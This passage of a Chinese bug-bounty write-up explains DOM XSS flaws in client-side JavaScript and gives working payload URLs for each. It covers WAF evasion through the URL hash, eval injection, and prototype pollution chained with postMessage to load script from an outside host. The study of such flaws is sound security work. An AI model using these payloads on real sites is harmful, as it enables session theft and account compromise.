              , i = a.param(n.search); 
            if (i && i.state && (i.code || i.oauth_token)) 
                r = JSON.parse(i.state), 
                i.redirect_uri = r.redirect_uri || n.href.replace(/[\?\#].*$/, ""), 
                r = a.qs(r.oauth_proxy, i), 
                n.assign(r); 
            else if ((i = a.merge(a.param(n.search || ""), a.param(n.hash || ""))) && "s
tate"in i) { 
                try { 
                    var o = JSON.parse(i.state); 
                    a.extend(i, o)
                } catch (e) { 
                    var r = decodeURIComponent(i.state); 
                    try { 
                        var s = JSON.parse(r); 
                        a.extend(i, s) 
                    } catch (e) { 
                        console.error("Could not decode state parameter") 
                    } 
                } 
                "access_token"in i && i.access_token && i.network ? (i.expires_in && 0 !
== parseInt(i.expires_in, 10) || (i.expires_in = 0), 
                i.expires_in = parseInt(i.expires_in, 10), 
                i.expires = (new Date).getTime() / 1e3 + (i.expires_in || 31536e3), 
                l(i, 0, t)) : "error"in i && i.error && i.network ? (i.error = { 
                    code: i.error,
                    message: i.error_message || i.error_description 
                }, 
                l(i, 0, t)) : i.callback && i.callback in t && (o = !!("result"in i && 
i.result) && JSON.parse(i.result),
                d(t, i.callback)(o), 
                u()), 
                i.page_uri && n.assign(i.page_uri) 
            } else 
                "oauth_redirect"in i && n.assign(decodeURIComponent(i.oauth_redirect)); 
这有多个可以 Xss的⽅法 
responseHandler 中 只要满⾜第⼀个if的条件，通过 location.assign()  ⽅法加载⼀个新的页⾯ r
Payload https://test.com/xss?state=
{"oauth_proxy":"javascript:alert(1);//"}&code=xss&oauth_token=xss
第⼆个if 太长没看 
如果前两个if都不满⾜，else也可以导致Xss,这是最简单的 
Payload https://test.com/xss?oauth_redirect=javascript:alert(1)
但是这个站的waf超级严格，根本绕不过 
但是在第⼆个if中 else if ((i = a.merge(a.param(n.search || ""), a.param(n.hash || ""))) &&
"state"in i)  
可以看到把 location.hash 也传给了 i ，依然使⽤最后的else内容来触发Xss，由于hash根本不会发送给服务端，所以
waf没⽤。
Payload https://test.com/xss#oauth_redirect=javascript:alert(1)
----- 2
离谱，居然获取第⼀个参数值作为script标签的src值。 
由于储存在localStorage 这算是个持久xss 只要⽤户不⾃⼰清除cookie或者访问有参数的页⾯ 
Payload https://test.com/xss?xss=data:,alert(1)// 或 
Payload https://test.com/xss?xss=//nj.rs
----- 3
var query = getQueryParams(); 
$.each(query, function(key, value) { 
    window[key] = value; 
}); 
function getQueryParams() { 
    var qs = document.location.search + '&' + document.location.hash.replace('#', ''); 
    qs = qs.split("+").join(" "); 
    var params = {}, 
        tokens, 
        re = /[?&]?([^=]+)=([^&]*)/g; 
    while (tokens = re.exec(qs)) {
        params[decodeURIComponent(tokens[1])] = decodeURIComponent(tokens[2]); 
    } 
    return params; 
} 
这个似乎是想把所有参数和hash中的参数储存在 window 对象中,可是这样可以修改⼀些原有的⼦对象，⽐如 location
Payload https://test.com/xss#location=javascript:alert(1)  
⼀般能⽤hash就⽤hash，因为这样不会被waf检测
----- 4 
通常eval很容易造成Xss，谨慎使⽤
String.prototype.queryStringToJSON = String.prototype.queryStringToJSON || function() { 
    var params = String(this)  // 上文中this = location.href 
      , params = params.substring(params.indexOf("?") + 1); 
    if (params = params.replace(/\+/g, "%20"), 
    "{" === params.substring(0, 1) && "}" === params.substring(params.length - 1)) 
        return eval(decodeURIComponent(params)); 
    params = params.split(/\&(amp\;)?/); 
    for (var json = {}, i = 0, n = params.length; i < n; ++i) { 
        var param = params[i] || null, key, value, key, value, keys, path, cmd, param; 
        null !== param && (param = param.split("="), 
        null !== param && (key = param[0] || null, 
        null !== key && void 0 !== param[1] && (value = param[1], 
        key = decodeURIComponent(key), 
        value = decodeURIComponent(value), 
        keys = key.split("."), 
        1 === keys.length ? json[key] = value : (path = "", 
        cmd = "", 
        $.each(keys, function(ii, key) { 
            path += '["' + key.replace(/"/g, '\\"') + '"]', 
            jsonCLOSUREGLOBAL = json, 
            cmd = "if ( typeof jsonCLOSUREGLOBAL" + path + ' === "undefined" ) jsonCLOSU
REGLOBAL' + path + " = {}", 
            eval(cmd), 
            json = jsonCLOSUREGLOBAL, 
            delete jsonCLOSUREGLOBAL 
        }), 
        jsonCLOSUREGLOBAL = json, 
        valueCLOSUREGLOBAL = value, 
        cmd = "jsonCLOSUREGLOBAL" + path + " = valueCLOSUREGLOBAL", 
        eval(cmd), 
        json = jsonCLOSUREGLOBAL, 
        delete jsonCLOSUREGLOBAL, 
        delete valueCLOSUREGLOBAL)))) 
    } 
    return json 
} 
第⼀处eval，只是通过if判断是否{}包裹
Payload 1 https://test.com/xss/?{alert(1)}
第⼆处eval，只要在传⼊eval的内容中，想办法让⾃⼰的js可以执⾏就⾏ 
在本地测试,，传⼊如下js就可以执⾏ 
if ( typeof jsonCLOSUREGLOBAL["x"]["\\"]);alert(1);//"] === "undeﬁned" )
jsonCLOSUREGLOBAL["x"]["\\"]);alert(1);//"] = {}  
所以 
Payload 2 https://test.com/xss/?x.\%22]);alert(1);/%2f=1
第3处eval，略。
----- 5 
PostMessage Xss,这似乎有很多关于这种类型的⽂章。 
Client-Side Prototype Pollution参考 https://github.com/BlackFan/client-side-prototype-pollution 。这
俩个在BugBounty中也⾮常吃⾹。 
分享⼀个俩者结合的Xss
起因是 
我扫到⼀个 p8.testa.com 的Client-Side Prototype Pollution，搞了很久之后，终于可以Xss 
https://p8.testa.com/gb/view?ssc=us1&member=chinna.padma&constructor[prototype]
[jsAttributes][onafterscriptexecute]=alert(document.domain)  
但是⼚商却说这个域名超出范围，我并不想让努⼒⽩费 
然后我寻找到明确范围内的⼀处PostMessage
var POLL_INTERVAL = 2e3, 
    MAX_POLLS = 3, 
    ALLOWED_ORIGINS_REGEX = /^https?\:\/\/([^\/\?]+\.)*((testa|testb|testc)\.(net|com|co
m\.au))(\:\d+)?([\/\?]|$)/; 
function onElementHeightChange(t, n, i, o) { 
    if (t && n) { 
        var r = t.clientHeight, 
            a = 0, 
            m = 0; 
        o = o || MAX_POLLS, 
            "number" == typeof r && (r -= 1), 
            function e() { 
                a = t.clientHeight, 
                    m++, 
                    r !== a && (n(), r = a), 
                    t.onElementHeightChangeTimer && clearTimeout(t.onElementHeightChange
Timer), 
                    i ? t.onElementHeightChangeTimer = setTimeout(e, i) : m <= o && (t.o
nElementHeightChangeTimer = setTimeout(e, POLL_INTERVAL)) 
            }() 
    } 
} 
window.addEventListener("message",
    function(e) { 
        if (ALLOWED_ORIGINS_REGEX.test(e.origin)) { 
            if ("string" != typeof e.data) return; 
            var t = e.source, 
                n = e.origin, 
                i = {}; 
            try { 
                i = JSON.parse(e.data) 
            } catch (e) { 
                return 
            } 
            var o, r = i.id || 0, 
                a = i.markup, 
                m = i.scriptSrc, 
                c = "", 
                d = function() { 
                    c = r + ":" + document.body.clientHeight, 
                        t.postMessage(c, n) 
                }; 
            if (a && (document.body.innerHTML = a, !m)) return void d(); 
            m && ((o = document.createElement("script")).src = m, o.onload = function() 
{ 
                    onElementHeightChange(document.body, d, i.pollInterval, i.maxPolls) 
                }, 
                document.body.appendChild(o)) 
        } 
    }) 
很明显此处，获取message中json字段 scriptSrc 作为script的src值,尽管已经验证了 origin ,但是由于有验证域的Xss,所
以可以通过验证获得Xss
Payload
https://p8.testa.com/gb/view?ssc=us1&member=chinna.padma&constructor[prototype][jsAttrib
utes][onafterscriptexecute]=document.body.innerHTML=%27%3Ciframe%20src=%22https://s.xx.c
om/yc/html/embed-iframe-min.2d7457d4.html%22%20onload=%22this.contentWindow.postMessage
(window.atob(\%27eyJpZCI6IjEiLCJtYXJrdXAiOiJ4Iiwic2NyaXB0U3JjIjoiaHR0cHM6Ly9uai5ycyIsInB
vbGxJbnRlcnZhbCI6IngiLCJtYXhQb2xscyI6IngifQ==\%27),\%27*\%27)%22%3E%3C/iframe%3E%27 
结语
Dom Xss的形式还有很多，我把在BugBounty中遇到⽐较多见的形式分享出来，仅供参考。 
由于很多都是在过去报告中摘出来的，所以可能有错误，欢迎指正，但主要是理解意思就好。 
也欢迎交流，跟着⼤佬师傅们学习 😄